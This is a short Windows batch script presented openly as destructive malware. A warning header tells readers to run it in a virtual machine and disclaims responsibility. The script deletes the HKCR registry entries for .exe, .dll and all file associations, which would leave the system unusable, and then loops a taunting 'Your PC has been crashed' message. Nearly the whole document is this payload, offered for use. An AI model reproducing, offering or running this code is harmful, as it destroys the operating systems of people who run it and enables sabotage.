 WARNING: This code will destroy your operating system's registry key making it unrecoverable and unusable. Highly recomend running this on a Virtual 
 Machine. I am not responsible for any damages. Use at your own risk.
 
 -----------------------------------------
 
 @ECHO OFF
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 :MESSAGE
 ECHO Your PC has been crashed.Your Dad.
 GOTO MESSAGE
